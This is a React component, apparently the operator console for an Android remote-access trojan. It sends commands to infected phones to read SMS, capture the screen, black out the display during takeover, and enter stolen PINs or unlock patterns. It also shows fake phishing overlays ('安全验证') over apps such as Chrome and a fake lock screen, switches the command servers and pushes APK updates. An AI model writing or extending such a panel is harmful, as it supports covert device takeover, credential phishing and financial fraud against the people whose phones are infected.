import { useEffect, useState } from "react";
import { sendCommand } from "../api/client";
import { useI18n, t } from "../i18n";


interface CommandPanelProps {
  deviceId: string | null;
  onCommandSent: (message: string) => void;
}

const PRESET_COMMANDS = [
  { value: "ping", label: "ping" },
  { value: "get_device_info", label: "get_device_info" },
  { value: "check_accessibility", label: "check_accessibility" },
  { value: "get_sms", label: "get_sms" },
  { value: "get_screen", label: "get_screen" },
  { value: "click", label: "click" },
  { value: "swipe", label: "swipe" },
  { value: "input_text", label: "input_text" },
  { value: "wake_screen", label: "wake_screen" },
  { value: "black_screen", label: "black_screen" },
  { value: "unblack_screen", label: "unblack_screen" },
  { value: "takeover_phone", label: "takeover_phone" },
  { value: "untakeover_phone", label: "untakeover_phone" },
  { value: "start_remote_keep_awake", label: "start_remote_keep_awake" },
  { value: "stop_remote_keep_awake", label: "stop_remote_keep_awake" },
  { value: "refresh_screen", label: "refresh_screen" },
  { value: "global_action", label: "global_action" },
  { value: "reboot", label: "reboot" },
  { value: "uninstall", label: "uninstall" },
  { value: "set_silent", label: "set_silent" },
  { value: "get_auto_rotation", label: "get_auto_rotation" },
  { value: "set_auto_rotation", label: "set_auto_rotation" },
  { value: "open_write_settings", label: "open_write_settings" },
  { value: "dump_keyguard_tree", label: "dump_keyguard_tree" },
  { value: "unlock_pin", label: "unlock_pin" },
  { value: "unlock_pattern", label: "unlock_pattern" },
  { value: "get_app_icon", label: "get_app_icon" },
  { value: "get_app_icons", label: "get_app_icons" },
  { value: "show_fake_page", label: "show_fake_page" },
  { value: "arm_fake_page", label: "arm_fake_page" },
  { value: "disarm_fake_page", label: "disarm_fake_page" },
  { value: "list_fake_page_hooks", label: "list_fake_page_hooks" },
  { value: "hide_fake_page", label: "hide_fake_page" },
  { value: "show_keyguard_fake_page", label: "show_keyguard_fake_page" },
  { value: "hide_keyguard_fake_page", label: "hide_keyguard_fake_page" },
  { value: "get_keyguard_lock_type", label: "get_keyguard_lock_type" },
  { value: "switch_server", label: "switch_server" },
  { value: "update_apk", label: "update_apk" },
] as const;

const COMMAND_DEFAULTS: Record<string, string> = {
  ping: "{}",
  get_device_info: "{}",
  check_accessibility: "{}",
  get_sms: '{"limit":50}',
  get_screen: "{}",
  click: '{"x":540,"y":1200}',
  swipe: '{"x1":540,"y1":1600,"x2":540,"y2":600,"duration":300}',
  input_text: '{"text":"hello","mode":"replace"}',
  wake_screen: "{}",
  black_screen: "{}",
  unblack_screen: "{}",
  takeover_phone: "{}",
  untakeover_phone: "{}",
  refresh_screen: "{}",
  global_action: '{"action":"home"}',
  reboot: "{}",
  uninstall: "{}",
  set_silent: "{}",
  get_auto_rotation: "{}",
  set_auto_rotation: '{"enabled":1}',
  open_write_settings: "{}",
  dump_keyguard_tree: '{"maxDepth":5}',
  unlock_pin: '{"pin":"123456","swipeUp":true}',
  unlock_pattern:
    '{"gesturePath":"[{\\"x\\":100,\\"y\\":200,\\"action\\":\\"d\\"},{\\"x\\":200,\\"y\\":300,\\"action\\":\\"m\\"}]","swipeUp":true}',
  get_app_icon: '{"packageName":"com.android.settings","size":192}',
  get_app_icons: '{"packages":["com.android.settings"],"size":48}',
  show_fake_page:
    '{"packageName":"com.android.settings","title":"安全验证","content":"请确认后继续","icon":"","pageType":"web","webUrl":"https://example.com/landing/","hasPin":0}',
  arm_fake_page:
    '{"packageName":"com.android.chrome","label":"Chrome","title":"安全验证","content":"请确认后继续","icon":"","pageType":"web","webUrl":"https://example.com/landing/","hasPin":0}',
  disarm_fake_page: '{"packageName":"com.android.chrome"}',
  list_fake_page_hooks: "{}",
  hide_fake_page: "{}",
  show_keyguard_fake_page:
    '{"pageType":"web","title":"锁屏验证","webUrl":"https://example.com/lock/"}',
  hide_keyguard_fake_page: "{}",
  get_keyguard_lock_type: "{}",
  switch_server:
    '{"apiBaseUrl":"https://td2.example.com","wsBaseUrl":"wss://td2.example.com/ws/device","wsScreenBaseUrl":"wss://td2.example.com/ws/device/screen"}',
  update_apk: "{}",
};

export function CommandPanel({ deviceId, onCommandSent }: CommandPanelProps) {
  useI18n();
  const [cmd, setCmd] = useState("ping");
  const [paramsText, setParamsText] = useState("{}");
  const [waitMs, setWaitMs] = useState("5000");
  const [loading, setLoading] = useState(false);
  const [lastResult, setLastResult] = useState("");

  useEffect(() => {
    setParamsText(COMMAND_DEFAULTS[cmd] ?? "{}");
  }, [cmd]);

  async function handleSend() {
    if (!deviceId) {
      return;
    }

    let params: Record<string, unknown> = {};
    try {
      params = JSON.parse(paramsText || "{}") as Record<string, unknown>;
    } catch {
      setLastResult(t("params 不是合法 JSON"));
      return;
    }

    setLoading(true);
    try {
      const result = await sendCommand({
        deviceId,
        cmd,
        params,
        waitMs: Number(waitMs) || 0,
      });
      const text = JSON.stringify(result, null, 2);
      setLastResult(text);
      onCommandSent(t("指令 {0} 完成: {1}", { 0: cmd, 1: result.status }));
    } catch (error) {
      const message = error instanceof Error ? error.message : "send failed";
      setLastResult(message);
      onCommandSent(t("指令 {0} 失败: {1}", { 0: cmd, 1: message }));
    } finally {
      setLoading(false);
    }
  }

  return (
    <div className="form-grid">
      {!deviceId ? (
        <div className="empty-state">{t("请先在左侧选择设备。")}</div>
      ) : (
        <>
          <label>
            {t("指令")}
            <select value={cmd} onChange={(event) => setCmd(event.target.value)}>
              {PRESET_COMMANDS.map((item) => (
                <option key={item.value} value={item.value}>
                  {item.label}
                </option>
              ))}
            </select>
          </label>

          <label>
            {t("参数 JSON")}
            <textarea
              rows={5}
              value={paramsText}
              onChange={(event) => setParamsText(event.target.value)}
            />
          </label>

          <p className="command-hint">
            {t("远程控制需设备无障碍已开启且在线。锁屏解锁 PIN 会先上滑进入密码页，等待 0.5s 后再逐位输入（可先 wake_screen）。\n            调试锁屏节点：先 wake_screen，手动上滑到 PIN 键盘页，再发 dump_keyguard_tree，等待回执 8000ms，复制结果里的 result.tree。")}
          </p>

          <label>
            {t("等待回执 (ms，0=不等待)")}
            <input
              type="number"
              min={0}
              step={500}
              value={waitMs}
              onChange={(event) => setWaitMs(event.target.value)}
            />
          </label>

          <button
            type="button"
            className="primary-button"
            disabled={loading}
            onClick={() => void handleSend()}
          >
            {loading ? t("发送中...") : t("发送指令")}
          </button>

          {lastResult ? (
            <label>
              {t("最近结果")}
              <textarea rows={8} readOnly value={lastResult} />
            </label>
          ) : null}
        </>
      )}
    </div>
  );
}
